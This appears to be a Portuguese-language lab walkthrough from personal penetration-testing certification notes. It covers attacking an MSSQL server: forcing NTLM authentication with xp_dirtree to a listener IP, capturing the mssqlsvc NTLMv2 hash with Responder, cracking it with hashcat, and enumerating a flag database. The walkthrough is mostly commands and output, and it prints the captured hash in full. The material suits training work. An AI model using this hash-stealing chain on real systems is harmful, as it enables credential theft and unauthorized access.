> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/attacking-common-services/sql-databases/questions.md).

# Questions

1. **Qual é a senha do usuário "mssqlsvc"?**

* Conecte ao SQL Server com as credencias fornecidas

```
impacket-mssqlclient htbdbuser@10.129.203.12
```

* Iniciar o Responder em outro terminal para o roubo de hash

```
sudo responder -I tun0
```

* **XP\_DIRTREE Hash Stealing**

```
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

* Eventos do `responder`

```
                                        __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.203.12
[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:c7b964f2fbf34b15:88927769B1E8C8F70FEA7166BD421FED:01010000000000008099DF7DCB9DDC0178C3BE7E628FD7DF0000000002000800440046004100570001001E00570049004E002D004E00380054004A00450039004A0046004C004600380004003400570049004E002D004E00380054004A00450039004A0046004C00460038002E0044004600410057002E004C004F00430041004C000300140044004600410057002E004C004F00430041004C000500140044004600410057002E004C004F00430041004C00070008008099DF7DCB9DDC01060004000200000008003000300000000000000000000000003000009AEC90ACA758890DCC0AABF5E2093D51AF77B06FB5BE30689F0AA2C7421A47910A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200350034000000000000000000
```

* Quebrar a senha com o `hashcat`&#x20;

```
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt 
```

***

2. **Enumere o banco de dados "flagDB" e envie uma flag como resposta.**

```
impacket-mssqlclient MSSQLSVC@10.129.203.12 -windows-auth

SQL (WIN-02\mssqlsvc  guest@master)> USE flagDB
ENVCHANGE(DATABASE): Old Value: master, New Value: flagDB
INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'flagDB'.
SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> SELECT * FROM flagDB.INFORMATION_SCHEMA.TABLES
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
flagDB          dbo            tb_flag      b'BASE TABLE'   

SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> sqlcmd> SELECT * FROM tb_flag
SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> SELECT * FROM tb_flag
```
